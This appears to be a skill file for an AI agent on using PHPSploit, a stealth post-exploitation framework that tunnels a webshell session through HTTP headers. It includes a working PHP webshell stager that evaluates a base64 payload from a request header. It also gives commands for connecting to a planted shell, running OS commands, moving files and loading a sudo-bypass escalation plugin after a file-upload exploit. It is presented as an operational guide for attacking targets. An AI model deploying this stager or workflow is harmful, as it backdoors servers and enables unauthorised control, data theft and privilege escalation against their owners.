---
name: phpsploit
description: "Stealth post-exploitation framework operating via HTTP headers inside a webshell. Use when you have a PHP webshell on target and need an interactive shell, file ops, and plugin-based post-exploitation over HTTP."
license: MIT
compatibility: "Python 3; pip install phpsploit; Linux/macOS; github.com/nil0x42/phpsploit"
metadata:
  author: AeonDave
  version: "1.0"
---

# PHPSploit

Stealth PHP webshell framework — full interactive session tunneled in HTTP headers.

## Quick Start

```bash
pip install phpsploit
phpsploit

# Set target and connect
set TARGET http://target.com/shell.php
set PASSKEY MySecret
exploit
```

## Core Commands

| Command | Purpose |
|---------|---------|
| `set TARGET <url>` | Webshell URL |
| `set PASSKEY <key>` | Obfuscation passkey |
| `exploit` | Connect to shell |
| `ls`, `cd`, `cat` | File system ops |
| `upload <local> <remote>` | Upload file |
| `download <remote>` | Download file |
| `run <cmd>` | Execute OS command |
| `load <plugin>` | Load plugin |

## Webshell Setup

Minimal PHP stager (upload to target):
```php
<?php @eval(base64_decode($_SERVER['HTTP_X_PAYLOAD']));
```

## Common Workflows

**Post-exploitation after file upload vuln:**
```
set TARGET http://target.com/uploads/shell.php
exploit
run whoami
```

**Escalate with plugin:**
```
load post/exploit/sudo-bypass
run
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Webshell variants and plugin list |
